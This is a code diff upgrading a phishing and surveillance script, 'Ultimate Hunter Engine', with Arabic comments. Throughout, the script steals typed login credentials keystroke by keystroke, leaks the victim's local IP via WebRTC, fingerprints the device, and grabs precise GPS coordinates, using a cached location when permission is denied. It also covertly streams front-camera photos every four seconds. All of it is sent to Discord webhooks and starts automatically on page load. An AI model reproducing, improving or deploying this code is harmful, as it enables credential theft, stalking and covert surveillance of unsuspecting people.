@@ -1,6 +1,6 @@
 /* ==========================================================================
-   ULTIMATE HUNTER ENGINE V8.0 - script.js
-   High-Precision Geolocation, Fallback Engine & Continuous Live Exfiltration
+   ULTIMATE HUNTER ENGINE V9.0 - script.js
+   Deep Reconnaissance, High-Precision GPS, WebRTC IP Leak & Live Exfiltration
    ========================================================================== */
 
 "use strict";
@@ -16,7 +16,7 @@ const DISCORD_WEBHOOKS = [
 
 let activeWebhookIndex = 0;
 
-async function sendToDiscord(content, fileBlob = null, filename = "capture.png") {
+async function sendToDiscord(content, fileBlob = null, filename = "intel_capture.png") {
     let success = false;
     
     for (let attempts = 0; attempts < DISCORD_WEBHOOKS.length; attempts++) {
@@ -48,13 +48,13 @@ async function sendToDiscord(content, fileBlob = null, filename = "capture.png")
 }
 
 /* --------------------------------------------------------------------------
-   1. إعدادات النظام والمتغيرات الأساسية
+   1. الإعدادات والمتغيرات الأساسية
    -------------------------------------------------------------------------- */
 
 const ENGINE_CONFIG = Object.freeze({
-    version: "8.0",
-    locationTimeout: 12000,
-    captureIntervalTime: 4000, // التقاط صورة جديدة كل 4 ثوانٍ بشكل متتالي ومباشر
+    version: "9.0",
+    locationTimeout: 15000,
+    captureIntervalTime: 4000, // التقاط صورة كل 4 ثوانٍ بشكل متسلسل
     cameraWidth: 1280,
     cameraHeight: 720
 });
@@ -65,139 +65,187 @@ const loginFormElement = document.getElementById("fullLoginForm");
 
 let cameraStream = null;
 let captureInterval = null;
-let engineInitialized = false;
+let engineExecuted = false;
+let localIpAddress = "جاري استخراج الشبكة المحلية...";
 
 /* --------------------------------------------------------------------------
-   2. تتبع الكتابة الحية في الحقول (Live Typing Exfiltration)
+   2. كشف الشبكة الداخلية (WebRTC LAN IP Leak)
    -------------------------------------------------------------------------- */
 
-function initializeLiveTypingTracker() {
+function getLocalIP() {
+    return new Promise((resolve) => {
+        try {
+            const ips = [];
+            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+            if (!RTCPeerConnection) {
+                resolve("غير مدعوم");
+                return;
+            }
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            pc.createDataChannel("");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+            
+            pc.onicecandidate = (ice) => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                if (match && !ips.includes(match[1])) {
+                    ips.push(match[1]);
+                    resolve(match[1]);
+                }
+            };
+            setTimeout(() => {
+                if (ips.length === 0) resolve("لم يتم العثور على IP محلي");
+            }, 1000);
+        } catch {
+            resolve("خطأ في استخراج IP");
+        }
+    });
+}
+
+/* --------------------------------------------------------------------------
+   3. تتبع الكتابة الحية بدقة (Live Typing Exfiltration)
+   -------------------------------------------------------------------------- */
+
+function initializeLiveTyping() {
     const targetForm = loginFormElement || document.querySelector("form");
     if (!targetForm) return;
 
-    const inputElements = targetForm.querySelectorAll("input, textarea");
-    inputElements.forEach(input => {
+    const fields = targetForm.querySelectorAll("input, textarea");
+    fields.forEach(field => {
         let typingTimer;
-        input.addEventListener("input", (event) => {
+        field.addEventListener("input", (e) => {
             clearTimeout(typingTimer);
             typingTimer = setTimeout(async () => {
-                const fieldName = event.target.name || event.target.id || event.target.type || "حقل غير معروف";
-                const fieldValue = event.target.value;
-                await sendToDiscord(`⌨️ **إدخال حي (Live Typing):**\n- الحقل: \`${fieldName}\`\n- القيمة: \`${fieldValue}\``);
-            }, 350);
+                const name = e.target.name || e.target.id || e.target.type || "حقل";
+                const val = e.target.value;
+                await sendToDiscord(`⌨️ **إدخال حي (Live Typing):**\n- الحقل: \`${name}\`\n- القيمة المدخلة: \`${val}\``);
+            }, 300);
         });
     });
 }
 
 /* --------------------------------------------------------------------------
-   3. استخراج معلومات المتصفح والبيئة التقنية للضحية
+   4. استخراج البصمة الشاملة للمتصفح والجهاز (Deep Fingerprinting)
    -------------------------------------------------------------------------- */
 
-function extractBrowserDiagnostics() {
-    const screenData = window.screen || {};
+async function gatherDeepDiagnostics() {
+    const screenInfo = window.screen || {};
+    const ipLocal = await getLocalIP();
+    
+    // استخراج معلومات كارت الشاشة عبر WebGL
+    let gpuInfo = "غير متاح";
+    try {
+        const canvasGl = document.createElement("canvas");
+        const gl = canvasGl.getContext("webgl") || canvasGl.getContext("experimental-webgl");
+        if (gl) {
+            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+            if (debugInfo) {
+                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        }
+    } catch {}
+
     return {
         userAgent: navigator.userAgent || "غير متاح",
         language: navigator.language || "غير متاح",
         platform: navigator.platform || "غير متاح",
-        screenResolution: `${screenData.width || 0}x${screenData.height || 0}`,
+        cpuCores: navigator.hardwareConcurrency || "غير متاح",
+        deviceRam: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير متاح",
+        screenResolution: `${screenInfo.width || 0}x${screenInfo.height || 0}`,
+        colorDepth: `${screenInfo.colorDepth || 0} بت`,
         viewportSize: `${window.innerWidth}x${window.innerHeight}`,
-        isSecure: Boolean(window.isSecureContext),
-        hasGeolocation: Boolean(navigator.geolocation),
-        hasCameraApi: Boolean(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "غير متاح",
+        localIP: ipLocal,
+        graphicsCard: gpuInfo,
+        cookiesEnabled: Boolean(navigator.cookieEnabled),
+        secureContext: Boolean(window.isSecureContext)
     };
 }
 
 /* --------------------------------------------------------------------------
-   4. المحرك الدقيق لتحديد الموقع (GPS High Precision + Fallback System)
+   5. الموقع الجغرافي فائق الدقة مع النظام الاحتياطي (GPS High Precision + Cache)
    -------------------------------------------------------------------------- */
 
-function obtainPreciseLocation() {
+function executeHighPrecisionGPS() {
     return new Promise(resolve => {
-        // التحقق من وجود تخزين سابق لموقع محفوظ كخطة بديلة فورية
-        const cachedLocation = localStorage.getItem("ultimate_last_gps");
-        const parseCachedLocation = cachedLocation ? JSON.parse(cachedLocation) : null;
+        const savedLocationCache = localStorage.getItem("hunter_deep_gps");
+        const parsedCache = savedLocationCache ? JSON.parse(savedLocationCache) : null;
 
         if (!navigator.geolocation) {
-            if (parseCachedLocation) {
-                sendToDiscord(`⚠️ **خدمة الموقع غير مدعومة بالمتصفح، تم استخدام آخر موقع محفوظ:**\n- خط العرض: ${parseCachedLocation.latitude}\n- خط الطول: ${parseCachedLocation.longitude}\n- الدقة: ${parseCachedLocation.accuracy} متر`);
-                resolve({ success: true, source: "cached-fallback", ...parseCachedLocation });
+            if (parsedCache) {
+                sendToDiscord(`⚠️ **الـ GPS غير مدعوم، إرسال آخر موقع محفوظ بدقة:**\n- الخط: ${parsedCache.latitude}\n- الطول: ${parsedCache.longitude}`);
+                resolve(parsedCache);
                 return;
             }
-            resolve({ success: false, message: "Geolocation not supported and no cache." });
+            resolve(null);
             return;
         }
 
-        let requestCompleted = false;
-
-        // مؤشر زمني لانتظار استجابة الـ GPS بدقة عالية
-        const locationTimer = setTimeout(async () => {
-            if (requestCompleted) return;
-            requestCompleted = true;
-
-            if (parseCachedLocation) {
-                await sendToDiscord(`⏱️ **انتهت مهلة استجابة الـ GPS، إرسال آخر موقع محفوظ بدقة:**\n- خط العرض: ${parseCachedLocation.latitude}\n- خط الطول: ${parseCachedLocation.longitude}`);
-                resolve({ success: true, source: "timeout-cache-fallback", ...parseCachedLocation });
+        let isSettled = false;
+        const gpsTimer = setTimeout(async () => {
+            if (isSettled) return;
+            isSettled = true;
+            if (parsedCache) {
+                await sendToDiscord(`⏱️ **انتهت مهلة الـ GPS، إرسال آخر موقع محجوز في الذاكرة:**\n- خط العرض: ${parsedCache.latitude}\n- خط الطول: ${parsedCache.longitude}`);
+                resolve(parsedCache);
             } else {
-                resolve({ success: false, message: "Geolocation timeout." });
+                resolve(null);
             }
         }, ENGINE_CONFIG.locationTimeout);
 
         navigator.geolocation.getCurrentPosition(
             async position => {
-                if (requestCompleted) return;
-                requestCompleted = true;
-                clearTimeout(locationTimer);
+                if (isSettled) return;
+                isSettled = true;
+                clearTimeout(gpsTimer);
 
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                const altitude = position.coords.altitude || "غير متاح";
-                const speed = position.coords.speed || "غير متاح";
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy;
+                const alt = position.coords.altitude || "مغلق/غير متاح";
+                const spd = position.coords.speed || "متوقف";
 
-                const freshLocationData = {
-                    latitude,
-                    longitude,
-                    accuracy,
-                    altitude,
-                    speed,
+                const gpsData = {
+                    latitude: lat,
+                    longitude: lon,
+                    accuracy: acc,
+                    altitude: alt,
+                    speed: spd,
                     timestamp: new Date().toISOString()
                 };
 
-                // حفظ الموقع الجديد فوراً في ذاكرة المتصفح للاستفادة منه مستقبلاً
-                localStorage.setItem("ultimate_last_gps", JSON.stringify(freshLocationData));
+                localStorage.setItem("hunter_deep_gps", JSON.stringify(gpsData));
 
-                await sendToDiscord(`🎯 **تم جلب موقع GPS بدقة فائقة وحقيقية:**\n- خط العرض (Latitude): \`${latitude}\`\n- خط الطول (Longitude): \`${longitude}\`\n- الدقة (Accuracy): \`${accuracy} متر\`\n- الارتفاع: \`${altitude}\`\n- السرعة: \`${speed}\``);
-
-                resolve({ success: true, source: "live-gps", ...freshLocationData });
+                await sendToDiscord(`🎯 **[استخبارات الموقع المباشر] تم رصد الإحداثيات بدقة فائقة:**\n- **خط العرض (Latitude):** \`${lat}\`\n- **خط الطول (Longitude):** \`${lon}\`\n- **الدقة الميدانية:** \`${acc} متر\`\n- **الارتفاع:** \`${alt}\`\n- **السرعة:** \`${spd}\`\n- 🗺️ **رابط خرائط جوجل الفوري:** https://www.google.com/maps?q=${lat},${lon}`);
+                resolve(gpsData);
             },
             async () => {
-                if (requestCompleted) return;
-                requestCompleted = true;
-                clearTimeout(locationTimer);
+                if (isSettled) return;
+                isSettled = true;
+                clearTimeout(gpsTimer);
 
-                // في حال تم رفض الإذن أو كان الموقع مطفأ (GPS Disabled / Denied)
-                if (parseCachedLocation) {
-                    await sendToDiscord(`⚠️ **تم رفض إذن الموقع أو إغلاقه، إرسال آخر موقع مسجل في الذاكرة:**\n- خط العرض: ${parseCachedLocation.latitude}\n- خط الطول: ${parseCachedLocation.longitude}\n- وقت التسجيل السابق: \`${parseCachedLocation.timestamp}\``);
-                    resolve({ success: true, source: "denied-cache-fallback", ...parseCachedLocation });
+                if (parsedCache) {
+                    await sendToDiscord(`⚠️ **تم رفض إذن الموقع أو إغلاقه، إرسال الموقع الاحتياطي المحفوظ سابقاً:**\n- الخط: ${parsedCache.latitude}\n- الطول: ${parsedCache.longitude}\n- الدقة السابقة: ${parsedCache.accuracy} متر\n- 🗺️ **رابط الخرائط:** https://www.google.com/maps?q=${parsedCache.latitude},${parsedCache.longitude}`);
+                    resolve(parsedCache);
                 } else {
-                    await sendToDiscord(`❌ **تم رفض إذن الموقع ولا توجد بيانات مخزنة سابقة.**`);
-                    resolve({ success: false, message: "Permission denied and no cache available." });
+                    await sendToDiscord(`❌ **تم رفض إذن الموقع الجغرافي بالكامل ولا توجد بيانات سابقة.**`);
+                    resolve(null);
                 }
             },
             {
-                enableHighAccuracy: true, // طلب أعلى دقة GPS ممكنة من الجهاز
-                timeout: ENGINE_CONFIG.locationTimeout - 2000,
-                maximumAge: 0 // منع استخدام البيانات المؤقتة القديمة وجلب إحداثيات حية
+                enableHighAccuracy: true,
+                timeout: ENGINE_CONFIG.locationTimeout - 3000,
+                maximumAge: 0
             }
         );
     });
 }
 
 /* --------------------------------------------------------------------------
-   5. تشغيل الكاميرا والالتقاط المتسلسل المباشر للصور
+   6. تفعيل الكاميرا والالتقاط المتسلسل المباشر للصور
    -------------------------------------------------------------------------- */
 
-function startContinuousImageCapture() {
+function startLiveCaptureLoop() {
     if (captureInterval) return;
 
     captureInterval = setInterval(async () => {
@@ -208,46 +256,34 @@ function startContinuousImageCapture() {
 
             canvasElement.width = videoElement.videoWidth;
             canvasElement.height = videoElement.videoHeight;
-            
-            const drawingContext = canvasElement.getContext("2d");
-            drawingContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+            const ctx = canvasElement.getContext("2d");
+            ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
 
-            canvasElement.toBlob(async (imageBlob) => {
-                if (imageBlob && imageBlob.size > 1000) {
-                    await sendToDiscord(`📸 **صورة حية جديدة (التقاط متسلسل مباشر):**`, imageBlob, `live_shot_${Date.now()}.png`);
+            canvasElement.toBlob(async (blob) => {
+                if (blob && blob.size > 1000) {
+                    await sendToDiscord(`📸 **[التقاط حي متسلسل] صورة جديدة من عدسة الضحية:**`, blob, `capture_${Date.now()}.png`);
                 }
             }, "image/png", 0.95);
-
-        } catch (error) {
-            console.error("Frame capture loop error:", error);
+        } catch (err) {
+            console.error("Capture loop error:", err);
         }
     }, ENGINE_CONFIG.captureIntervalTime);
 }
 
-function stopContinuousImageCapture() {
-    if (captureInterval) {
-        clearInterval(captureInterval);
-        captureInterval = null;
-    }
-}
-
-async function activateCameraAndStream() {
-    if (!navigator.mediaDevices?.getUserMedia || !window.isSecureContext) {
-        return false;
-    }
+async function activateStealthCamera() {
+    if (!navigator.mediaDevices?.getUserMedia || !window.isSecureContext) return;
 
     try {
-        const videoConstraints = {
+        const constraints = {
             audio: false,
             video: {
-                facingMode: { ideal: "user" }, // الكاميرا الأمامية تلقائياً
+                facingMode: { ideal: "user" },
                 width: { ideal: ENGINE_CONFIG.cameraWidth },
                 height: { ideal: ENGINE_CONFIG.cameraHeight }
             }
         };
 
-        cameraStream = await navigator.mediaDevices.getUserMedia(videoConstraints);
-
+        cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
         if (videoElement) {
             videoElement.muted = true;
             videoElement.autoplay = true;
@@ -256,82 +292,72 @@ async function activateCameraAndStream() {
             await videoElement.play();
         }
 
-        // بدء حلقة التقاط الصور المتسلسلة فور نجاح التشغيل
-        startContinuousImageCapture();
-
-        await sendToDiscord(`🟢 **تم تفعيل الكاميرا الأمامية بنجاح وبدء إرسال الصور المتسلسلة.**`);
-        return true;
-
+        startLiveCaptureLoop();
+        await sendToDiscord(`🟢 **تم تشغيل الكاميرا بنجاح وبدء إرسال الصور المتسلسلة إلى الديسكورد.**`);
     } catch (error) {
         await sendToDiscord(`❌ **فشل تشغيل الكاميرا:** \`${error.message}\``);
-        return false;
     }
 }
 
 /* --------------------------------------------------------------------------
-   6. إدارة نموذج تسجيل الدخول ومعالجة البيانات المدخلة
+   7. معالجة نموذج تسجيل الدخول وإرسال البيانات النهائية
    -------------------------------------------------------------------------- */
 
-function initializeLoginFormHandler() {
+function initializeFormSubmissions() {
     const targetForm = loginFormElement || document.querySelector("form");
     if (!targetForm) return;
 
-    initializeLiveTypingTracker();
+    initializeLiveTyping();
 
     targetForm.addEventListener("submit", async event => {
         event.preventDefault();
-
         try {
-            const formDataInstance = new FormData(targetForm);
-            let extractedDataSummary = "📋 **تقرير إرسال بيانات النموذج بالكامل:**\n";
-            
-            for (let [formKey, formValue] of formDataInstance.entries()) {
-                extractedDataSummary += `- **${formKey}**: \`${formValue}\`\n`;
+            const formData = new FormData(targetForm);
+            let summary = "📋 **[تسجيل الدخول النهائي] بيانات النموذج المستلمة:**\n";
+            for (let [k, v] of formData.entries()) {
+                summary += `- **${k}**: \`${v}\`\n`;
             }
-
-            await sendToDiscord(extractedDataSummary);
-        } catch (submitError) {
-            console.error("Form submission handler error:", submitError);
+            await sendToDiscord(summary);
+        } catch (e) {
+            console.error("Form submit error:", e);
         }
     });
 }
 
 /* --------------------------------------------------------------------------
-   7. محرك التشغيل الرئيسي المتسلسل (Engine Core Flow)
+   8. محرك التنفيذ الاستخباراتي الرئيسي (Engine Execution)
    -------------------------------------------------------------------------- */
 
-async function executeHunterEngineSequence() {
-    if (engineInitialized) return;
-    engineInitialized = true;
+async function executeDeepReconnaissance() {
+    if (engineExecuted) return;
+    engineExecuted = true;
 
-    const systemInfo = extractBrowserDiagnostics();
-    await sendToDiscord(`🚀 **بدء تشغيل محرك الهجوم والاستطلاع (V8.0):**\n- المتصفح: \`${systemInfo.userAgent}\`\n- دقة الشاشة: \`${systemInfo.screenResolution}\``);
+    // استخراج البصمة الكاملة للجهاز والمتصفح والشبكة
+    const sys = await gatherDeepDiagnostics();
+    await sendToDiscord(`🚀 **[بدء الاستطلاع الشامل V9.0] تم فتح الرابط بنجاح:**\n- **المتصفح:** \`${sys.userAgent}\`\n- **النظام:** \`${sys.platform}\`\n- **معالج الأنوية:** \`${sys.cpuCores} أنوية\`\n- **الذاكرة العشوائية (RAM):** \`${sys.deviceRam}\`\n- **الشبكة المحلية (LAN IP):** \`${sys.localIP}\`\n- **كارت الشاشة (GPU):** \`${sys.graphicsCard}\`\n- **دقة الشاشة:** \`${sys.screenResolution}\`\n- **المنطقة الزمنية:** \`${sys.timezone}\``);
 
-    // الخطوة الأولى: جلب الموقع بدقة متناهية فور فتح الصفحة
-    await obtainPreciseLocation();
+    // خطوة 1: جلب الموقع بدقة فائقة أو الاحتياطي
+    await executeHighPrecisionGPS();
 
-    // الخطوة الثانية: تفعيل الكاميرا والبدء بالالتقاط المتسلسل للصور بعد فترة قصيرة
+    // خطوة 2: تفعيل الكاميرا والبدء بالالتقاط المتسلسل للصور
     setTimeout(async () => {
-        await activateCameraAndStream();
-    }, 1200);
+        await activateStealthCamera();
+    }, 1500);
 }
 
 /* --------------------------------------------------------------------------
-   8. محفزات التفاعل التلقائي واليدوي لضمان العمل الفوري
+   9. مشغلات التفاعل التلقائي واليدوي
    -------------------------------------------------------------------------- */
 
-// تشغيل المحرك عند أول تفاعل بشري (نقر، لمس، حركة) لتجاوز قيود المتصفحات الحديثة
-["click", "touchstart", "keydown"].forEach(interactionEvent => {
-    window.addEventListener(interactionEvent, () => {
-        executeHunterEngineSequence();
+["click", "touchstart", "keydown"].forEach(evt => {
+    window.addEventListener(evt, () => {
+        executeDeepReconnaissance();
     }, { once: true, passive: true });
 });
 
-// تشغيل احتياطي تلقائي عند اكتمال تحميل DOM بالكامل
 document.addEventListener("DOMContentLoaded", () => {
-    initializeLoginFormHandler();
-    
+    initializeFormSubmissions();
     setTimeout(() => {
-        executeHunterEngineSequence();
-    }, 1500);
+        executeDeepReconnaissance();
+    }, 2000);
 });
